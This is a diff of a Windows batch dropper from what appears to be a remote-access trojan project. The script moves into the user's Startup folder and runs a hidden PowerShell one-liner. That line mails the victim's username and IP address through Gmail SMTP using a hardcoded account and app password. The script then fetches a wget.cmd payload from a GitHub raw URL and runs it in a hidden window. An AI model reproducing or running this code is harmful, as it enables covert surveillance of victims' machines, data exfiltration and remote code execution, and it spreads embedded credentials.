@@ -8,19 +8,8 @@ set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 @rem go to startup
 cd %StartupDir%
 
-@rem create smtp.txt file for future reconnaissance
-(
-    echo $email = "defalttests@gmail.com"
-    echo $password = "nkos qxgo yxvo brmr"
-    echo $subject = "$env:username logs"
-    echo $ip = (get-netipaddress -addressfamily ipv4 -interfacealias ethernet).ipaddress
-    echo echo "ip : $ip">"$env:username.rat"
-    echo $smtp = New-Object system.net.mail.smtpclient("smtp.gmail.com","587")
-    echo $smtp.enableSSL=$true
-    echo $smtp.credentials=New-Object system.net.networkcredential($email,$password)
-    echo $smtp.send($email,$email,$subject,$ip)
-
-)>smtp.txt
+@rem Initial reconnaissance
+powershell.exe -nop -ep bypass -c "&{$email='defalttests@gmail.com';$password='nkos qxgo yxvo brmr';$subject=\"$env:username logs\";$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' }).IPAddress | Select-Object -First 1 | Out-String;$smtp=New-Object system.net.mail.smtpclient('smtp.gmail.com','587');$smtp.enableSSL=$true;$smtp.credentials=New-Object system.net.networkcredential($email,$password);$smtp.send($email,$email,$subject,$ip)}"
 
 @rem Download payload
 powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/wget.cmd' -outfile '.\wget.cmd'"
@@ -28,11 +17,13 @@ powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.gi
 @rem run the payload
 powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"
 
+pause
+
 @rem move back to saved directory
 cd %InitialPath%
 
 @REM del initial.cmd
-
+pause
 @REM (
 @REM     echo @echo off
 @REM     echo :loop
